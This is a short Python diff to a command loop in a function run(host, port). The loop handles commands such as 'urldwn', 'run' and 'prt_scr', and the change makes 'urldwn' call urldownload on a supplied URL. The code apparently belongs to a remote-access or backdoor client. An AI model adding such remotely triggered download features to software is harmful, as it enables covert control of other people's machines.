@@ -33,7 +33,7 @@ def run(host, port):
             elif command == "cpl":
                 pass
             elif command[:6] == "urldwn":
-                pass
+                urldownload(command[7:])
             elif command[:3] == "run":
                 pass
             elif command[:7] == "prt_scr":
